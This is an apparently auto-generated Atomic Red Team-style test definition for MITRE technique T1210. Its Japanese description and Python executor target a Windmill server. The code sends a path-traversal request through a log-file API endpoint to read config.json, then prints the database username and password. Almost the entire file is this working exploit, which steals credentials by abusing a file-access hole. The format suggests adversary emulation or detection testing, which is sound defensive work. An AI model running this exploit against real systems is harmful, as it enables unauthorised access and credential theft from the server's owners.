# Auto-generated by CIPHER v5.0
# Source: 50a8bfd05142
attack_technique: T1210
display_name: "T1210 - Extract Application Config via Path Traversal"
atomic_tests:
  - name: "T1210 - Extract Application Config via Path Traversal"
    description: |
      Windmill の設定ファイル (config.json) を取得し、データベース認証情報を抽出する。
    supported_platforms:
      - linux
    executor:
      name: python
      command: |
        import requests, json, os
        url = f'http://{os.getenv("TARGET_IP")}:8080/api/w/demo/jobs_u/get_log_file/../../../../app/config.json'
        resp = requests.get(url)
        config = json.loads(resp.text)
        print('DB User:', config['db']['username'])
        print('DB Pass:', config['db']['password'])
